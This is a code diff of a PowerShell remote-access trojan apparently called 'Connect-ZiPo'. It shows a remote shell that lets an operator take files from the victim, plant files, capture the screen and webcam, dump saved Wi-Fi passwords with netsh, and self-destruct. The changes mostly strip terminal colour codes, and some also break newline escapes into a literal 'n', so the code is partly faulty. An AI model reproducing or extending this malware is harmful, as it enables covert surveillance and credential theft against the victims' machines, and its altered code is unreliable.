@@ -6,16 +6,16 @@ function Connect-ZiPo {
     function Upload-File($path) {
         if (Test-Path $path) {
             $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
-            return "`e[33m[UPLOAD]::$(Split-Path $path -Leaf)::`e[0m" + $b64 + "`e[33m::END`e[0m"
+            return "[UPLOAD]::$(Split-Path $path -Leaf)::" + $b64 + "::END"
         } else {
-            return "`e[31m[ERROR]::FILE NOT FOUND: $path`e[0m"
+            return "[ERROR]::FILE NOT FOUND: $path"
         }
     }
 
     function Download-File($filename, $b64) {
         $out = "$env:TEMP\$filename"
         [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
-        return "`e[33m[DOWNLOADED] $out`e[0m"
+        return "[DOWNLOADED] $out"
     }
 
     function Take-Screenshot {
@@ -41,7 +41,7 @@ function Connect-ZiPo {
             return Upload-File $file
         }
         catch {
-            return "`e[31m[ERROR] Webcam not available`e[0m"
+            return "[ERROR] Webcam not available"
         }
     }
 
@@ -52,14 +52,14 @@ function Connect-ZiPo {
 
         $results = ""
         foreach ($profile in $profiles) {
-            $results += "[$profile]`n"
-            $results += (netsh wlan show profile name=\"$profile\" key=clear | Select-String "Key Content") + "`n"
+            $results += "[$profile]n"
+            $results += (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content") + "n"
         }
         return $results
     }
 
     function Get-BrowserCreds {
-        return "`e[34m[INFO] Browser creds not implemented — use external extractor.`e[0m"
+        return "[INFO] Browser creds not implemented — use external extractor."
     }
 
     function Tree-List {
@@ -85,7 +85,7 @@ function Connect-ZiPo {
             $esc = [char]27
             $clear = "$esc[2J$esc[H"
             $banner = @"
-${esc}[31;1m
+${esc}[31m
    ________ _______  ________  ________
   |\  _____\\  ___ \|\   __  \|\   ____\
   \ \  \__/ \ \   __<\ \  \|\  \ \  \___|
@@ -94,13 +94,13 @@ ${esc}[31;1m
      \ \__\    \ \_______\ \__\ \__\ \_______\
       \|__|     \|_______|\|__|\|__|\|_______|${esc}[0m
 
-${esc}[32;1m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
-[+] OS: $([System.Environment]::OSVersion.VersionString)
-[+] Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
-${esc}[37m------------------------------------------------------------${esc}[0m
+${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
+OS: $([System.Environment]::OSVersion.VersionString)
+Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
+------------------------------------------------------------
 "@
 
-            $intro = $clear + $banner + "${esc}[90m`nPS $currentDir> ${esc}[0m"
+            $intro = $clear + $banner + "nPS $currentDir> "
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
@@ -115,7 +115,7 @@ ${esc}[37m------------------------------------------------------------${esc}[0m
                     elseif ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(4).Trim()
                         if ([string]::IsNullOrWhiteSpace($path)) {
-                            $response = "`e[31m[ERROR] Usage: !get <full_path_to_file>`e[0m"
+                            $response = "[ERROR] Usage: !get <full_path_to_file>"
                         } else {
                             $response = Upload-File $path
                         }
@@ -125,7 +125,7 @@ ${esc}[37m------------------------------------------------------------${esc}[0m
                         if ($parts.Length -eq 3) {
                             $response = Download-File $parts[1].Trim() $parts[2].Trim()
                         } else {
-                            $response = "`e[31m[ERROR] INVALID POST FORMAT`e[0m"
+                            $response = "[ERROR] INVALID POST FORMAT"
                         }
                     }
                     elseif ($cmd -like "cd *") {
@@ -153,7 +153,7 @@ ${esc}[37m------------------------------------------------------------${esc}[0m
                         $response = Tree-List
                     }
                     elseif ($cmd -eq "!selfdestruct") {
-                        $response = "`e[91m[!] Self-destruct initiated...`e[0m"
+                        $response = "[!] Self-destruct initiated..."
                         $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
                         $stream.Write($outBytes, 0, $outBytes.Length)
                         $stream.Flush()
@@ -166,11 +166,12 @@ ${esc}[37m------------------------------------------------------------${esc}[0m
                     }
                 }
                 catch {
-                    $response = "`e[31m[ERROR] $($_.Exception.Message.ToUpper())`e[0m"
+                    $response = "[ERROR] $($_.Exception.Message.ToUpper())"
                 }
 
-                if (-not $response.EndsWith("`nPS $currentDir> ")) {
-                    $response += "`n`e[90mPS $currentDir> `e[0m"
+                # Универсальное добавление приглашения:
+                if (-not $response.EndsWith("nPS $currentDir> ")) {
+                    $response += "nPS $currentDir> "
                 }
 
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
